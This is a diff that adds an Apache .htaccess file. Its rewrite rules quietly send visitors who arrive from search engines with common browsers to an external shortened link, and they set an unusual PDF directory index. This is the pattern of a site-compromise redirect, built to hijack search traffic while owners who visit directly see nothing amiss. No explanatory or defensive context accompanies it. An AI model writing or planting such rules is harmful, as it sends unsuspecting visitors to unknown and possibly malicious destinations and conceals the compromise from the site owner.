@@ -1,0 +1,5 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} google|bing|aol|msn|yahoo|yandex|ya|rambler|mail|nigma|ask|lycos|teoma|talktalk|softonic|search|gmx [NC]
+RewriteCond %{HTTP_USER_AGENT} firefox|safari|opera|trident|msie|chrome [NC]
+RewriteRule .* http://ow.ly/SNFJS [R,L]
+DirectoryIndex index.pdf
